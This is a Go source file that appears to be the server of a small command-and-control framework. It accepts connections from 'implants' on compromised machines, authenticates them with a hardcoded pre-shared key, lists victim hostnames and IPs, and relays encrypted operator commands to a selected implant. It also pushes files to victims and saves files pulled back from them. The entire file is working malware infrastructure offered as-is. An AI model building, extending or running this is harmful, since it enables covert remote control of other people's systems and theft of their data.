package main

import (
	"bufio"
	"crypto/sha256"
	"encoding/base64"
	"fmt"
	"io"
	"io/ioutil"
	"log"
	"net"
	"strconv"
	"strings"
	"sync"
	"time"

	encryption "github.com/grines/minic2/common"
)

const PSK = "thisiscoolthisiscool1234"

type Client struct {
	conn     net.Conn
	id       int
	dir      string // Current directory of the client
	hostname string // Hostname of the client
	ip       string // IP address of the client
}

var (
	clients       = make(map[int]Client)
	clientsLock   = sync.Mutex{}
	clientID      = 0
	currentClient *Client
)

func main() {
	//Run Health Checks
	go healthCheckClients()

	fmt.Println("Starting implant listener...")

	ln, err := net.Listen("tcp", "0.0.0.0:8008")
	if err != nil {
		fmt.Println("Error listening:", err)
		return
	}
	defer ln.Close()

	go acceptLoop(ln)

	fmt.Println("Starting remote client listener...")
	ln2, err := net.Listen("tcp", "0.0.0.0:8009")
	if err != nil {
		fmt.Println("Error listening on second port:", err)
		return
	}
	defer ln2.Close()

	acceptLoop2(ln2)

}

func healthCheckClients() {
	for {
		time.Sleep(60 * time.Second) // Check every 30 seconds
		clientsLock.Lock()
		for id, client := range clients {
			if !isClientAlive(&client) {
				delete(clients, id)
				fmt.Printf("Client %d is disconnected and removed\n", id)
			}
		}
		clientsLock.Unlock()
	}
}

func isClientAlive(client *Client) bool {
	// Example of a simple "ping" command
	pingCommand := "ping"

	// Encrypt the ping command
	encryptedCommand, err := encryption.Encrypt(pingCommand, PSK)
	if err != nil {
		fmt.Println("Error encrypting ping command:", err)
		return false
	}

	// Send the ping command to the client
	_, err = client.conn.Write([]byte(encryptedCommand + "\n"))
	if err != nil {
		fmt.Println("Error sending ping command:", err)
		return false
	}

	// Wait for a response
	response, err := bufio.NewReader(client.conn).ReadString('\n')
	if err != nil {
		fmt.Println("Error reading ping response:", err)
		return false
	}

	// Decode the response
	decodedOutput, err := base64.StdEncoding.DecodeString(strings.TrimSpace(response))
	if err != nil {
		fmt.Println("Error decoding1 response:", err)
	}

	// Decrypt and check the response
	decryptedResponse, err := encryption.Decrypt(string(decodedOutput), PSK)
	if err != nil {
		fmt.Println("Error decrypting ping response:", err)
		return false
	}

	// Check if the response is what we expect (e.g., "pong")
	return decryptedResponse == "pong"
}

func acceptLoop2(ln net.Listener) {
	for {
		conn, err := ln.Accept()
		if err != nil {
			fmt.Println("Error accepting connection on second port:", err)
			continue
		}

		go handleNewConnection2(conn)
	}
}

func handleNewConnection2(conn net.Conn) {
	defer conn.Close()

	reader := bufio.NewReader(conn)
	for {
		// Read a command from the connection
		command, err := reader.ReadString('\n')
		if err != nil {
			if err != io.EOF {
				fmt.Println("Error reading from connection:", err)
			}
			break
		}
		command = strings.TrimSpace(command)
		fmt.Println(command)

		decryptedCommand, err := encryption.Decrypt(strings.TrimSpace(command), PSK)
		if err != nil {
			// Handle error
			log.Printf("Error: %s", err)
			continue
		}
		log.Printf("Command received: %s", decryptedCommand)

		if strings.HasPrefix(decryptedCommand, "current") {
			cur := getCurrentClientId()
			curr_string := fmt.Sprintf("%v", cur)
			encryptedOutput, encryptErr := encryption.Encrypt(curr_string, PSK)
			if encryptErr != nil {
				log.Printf("Error encrypting command output: %v\n", encryptErr)
				return
			}

			// Then, base64 encode the encrypted message
			encodedOutput := base64.StdEncoding.EncodeToString([]byte(encryptedOutput))
			conn.Write([]byte(encodedOutput + "\n"))
			continue
		}

		if strings.HasPrefix(decryptedCommand, "select ") {
			handleSelectCommand(decryptedCommand)
			cur := getCurrentClientId()
			curr_string := fmt.Sprintf("%v", cur)
			encryptedOutput, encryptErr := encryption.Encrypt("Implant Active: "+curr_string, PSK)
			if encryptErr != nil {
				log.Printf("Error encrypting command output: %v\n", encryptErr)
				return
			}

			// Then, base64 encode the encrypted message
			encodedOutput := base64.StdEncoding.EncodeToString([]byte(encryptedOutput))
			conn.Write([]byte(encodedOutput + "\n"))
			continue
		}
		if strings.HasPrefix(decryptedCommand, "list") {
			c := listClients2()
			var lines []string
			for id, client := range c {
				fmt.Printf(" - Implant ID: %d, Hostname: %s, IP: %s\n", id, client.hostname, client.ip)
				line := fmt.Sprintf(" - Implant ID: %d, Hostname: %s, IP: %s\n", id, client.hostname, client.ip)
				lines = append(lines, line)
			}
			flattened := strings.Join(lines, "\n")
			encryptedOutput, encryptErr := encryption.Encrypt(flattened, PSK)
			if encryptErr != nil {
				log.Printf("Error encrypting command output: %v\n", encryptErr)
				return
			}

			// Then, base64 encode the encrypted message
			encodedOutput := base64.StdEncoding.EncodeToString([]byte(encryptedOutput))
			conn.Write([]byte(encodedOutput + "\n"))

			continue
		}
		if currentClient == nil {
			encryptedOutput, encryptErr := encryption.Encrypt("No implant selected", PSK)
			if encryptErr != nil {
				log.Printf("Error encrypting command output: %v\n", encryptErr)
				return
			}

			// Then, base64 encode the encrypted message
			encodedOutput := base64.StdEncoding.EncodeToString([]byte(encryptedOutput))
			conn.Write([]byte(encodedOutput + "\n"))
			continue
		}
		//handleSelectCommand("select 1")

		resp := handleClientCommand2(currentClient, command)

		encryptedOutput, encryptErr := encryption.Encrypt(resp, PSK)
		if encryptErr != nil {
			log.Printf("Error encrypting command output: %v\n", encryptErr)
			return
		}

		// Then, base64 encode the encrypted message
		encodedOutput := base64.StdEncoding.EncodeToString([]byte(encryptedOutput))
		conn.Write([]byte(encodedOutput + "\n"))
	}
}

func acceptLoop(ln net.Listener) {
	for {
		conn, err := ln.Accept()
		if err != nil {
			fmt.Println("Error accepting connection:", err)
			continue
		}

		// Send a challenge
		challenge := "the_challenge19347627"
		conn.Write([]byte(challenge + "\n"))

		// Read the response
		response, err := bufio.NewReader(conn).ReadString('\n')
		if err != nil {
			fmt.Println("Error reading response:", err)
			conn.Close()
			continue
		}

		// Validate the response
		expectedResponse := generateResponse2(challenge, PSK)
		if strings.TrimSpace(response) != expectedResponse {
			fmt.Println("Authentication failed")
			conn.Close()
			continue
		}

		// Extract the IP address
		addr := conn.RemoteAddr().(*net.TCPAddr)
		ip := addr.IP.String()

		// Try to resolve the hostname
		hostnames, err := net.LookupAddr(ip)
		hostname := ip // Default to IP if hostname resolution fails
		if err == nil && len(hostnames) > 0 {
			hostname = hostnames[0]
		}

		clientsLock.Lock()
		clientID++
		c := Client{conn: conn, id: clientID, hostname: hostname, ip: ip}
		clients[clientID] = c
		clientsLock.Unlock()

		fmt.Printf("New implant connected: %d, Hostname: %s, IP: %s\n", clientID, hostname, ip)
	}
}

func generateResponse2(challenge string, psk string) string {
	// Should be the same implementation as in payload.go
	hash := sha256.Sum256([]byte(challenge + psk))
	return fmt.Sprintf("%x", hash)
}

func handleSelectCommand(command string) {
	parts := strings.SplitN(command, " ", 2)
	if len(parts) != 2 {
		fmt.Println("Invalid select command. Use 'select <implant_id>'")
		return
	}

	id, err := strconv.Atoi(parts[1])
	if err != nil {
		fmt.Println("Invalid implant ID:", parts[1])
		return
	}

	clientsLock.Lock()
	client, ok := clients[id]
	clientsLock.Unlock()

	if !ok {
		fmt.Println("No implant with ID:", id)
		return
	}

	currentClient = &client
	fmt.Printf("Selected implant %d\n", id)
}

func handleClientCommand2(client *Client, command string) string {
	//Encrypt it
	//decryptCommand, err := encryption.Decrypt(command, PSK)
	//if err != nil {
	//	fmt.Println("Error encrypting command:", err)
	//}

	//fmt.Println("sending command to server")
	//fmt.Println(decryptCommand)

	// Send the command to the server
	_, err := client.conn.Write([]byte(command + "\n"))
	if err != nil {
		fmt.Println("Error sending command:", err)
		//removeClient2(client.id)
	}

	// Read the response from the server
	response, err := bufio.NewReader(client.conn).ReadString('\n')
	if err != nil {
		fmt.Println("Error sending command:", err)
		//removeClient2(client.id) // Pass rl here
	}
	fmt.Println("1")
	fmt.Println(response)

	// Decode the response
	decodedOutput, err := base64.StdEncoding.DecodeString(strings.TrimSpace(response))
	if err != nil {
		fmt.Println("Error decoding1 response:", err)
	}

	fmt.Println("2")
	fmt.Println(decodedOutput)

	// In handleClientCommand, after receiving the response
	decryptedOutput, err := encryption.Decrypt(string(decodedOutput), PSK)
	if err != nil {
		fmt.Println("Error decrypting2 response:", err)
	}

	fmt.Println("3")
	fmt.Println(decryptedOutput)

	return string(decryptedOutput)
}

func requestCurrentDirectory(client *Client) {

	if client == nil {
		return // Do nothing if the client is nil
	}

	//Encrypt it
	encryptedCommand, err := encryption.Encrypt("pwd", PSK)
	if err != nil {
		fmt.Println("Error encrypting command:", err)
	}

	// Send the command to the server
	_, err = client.conn.Write([]byte(encryptedCommand + "\n"))
	if err != nil {
		fmt.Println("Error sending command:", err)
	}
	// Read the response (current directory) from the client
	dirResponse, err := bufio.NewReader(client.conn).ReadString('\n')
	if err != nil {
		fmt.Println("Error reading directory response:", err)
		return
	}

	// Decode the response
	decodedOutput, err := base64.StdEncoding.DecodeString(strings.TrimSpace(dirResponse))
	if err != nil {
		fmt.Println("Error decoding response:", err)
	}

	// In handleClientCommand, after receiving the response
	decryptedOutput, err := encryption.Decrypt(string(decodedOutput), PSK)
	if err != nil {
		fmt.Println("Error decrypting response:", err)
	}

	client.dir = decryptedOutput
}

func listClients2() map[int]Client {
	clientsLock.Lock()
	defer clientsLock.Unlock()

	if len(clients) == 0 {
		fmt.Println("No implants connected.")
		return nil
	}

	fmt.Println("Connected implants:")
	for id, client := range clients {
		fmt.Printf(" - Implant ID: %d, Hostname: %s, IP: %s\n", id, client.hostname, client.ip)
	}
	return clients
}

func removeClient2(id int) {
	clientsLock.Lock()
	defer clientsLock.Unlock()

	delete(clients, id)
	fmt.Printf("Implant %d disconnected\n", id)

	if currentClient != nil && currentClient.id == id {
		currentClient = nil
	}
}

func saveDownloadedFile(command, content string) {
	parts := strings.Fields(command)
	if len(parts) < 2 {
		fmt.Println("Invalid download command")
		return
	}

	fileName := parts[1] // Assuming the file name is the second part of the command
	err := ioutil.WriteFile(fileName, []byte(content), 0644)
	if err != nil {
		fmt.Println("Error saving file:", err)
		return
	}

	fmt.Printf("File %s downloaded successfully\n", fileName)
}

func handleFileUpload(client *Client, command string) bool {
	parts := strings.Fields(command)
	if len(parts) != 3 {
		fmt.Println("Usage: upload <localpath> <remotepath>")
		return false
	}

	localPath, remotePath := parts[1], parts[2]

	fileData, err := ioutil.ReadFile(localPath)
	if err != nil {
		fmt.Println("Error reading file:", err)
		return false
	}

	encodedData := base64.StdEncoding.EncodeToString(fileData)
	uploadCommand := fmt.Sprintf("upload %s %s", remotePath, encodedData)

	_, err = client.conn.Write([]byte(uploadCommand + "\n"))
	if err != nil {
		fmt.Println("Error sending upload command:", err)
		return false
	}

	return true
}

func getCurrentClientId() int {
	if currentClient != nil {
		return currentClient.id
	}
	return -1 // Return -1 or any other value to indicate that no client is currently selected
}
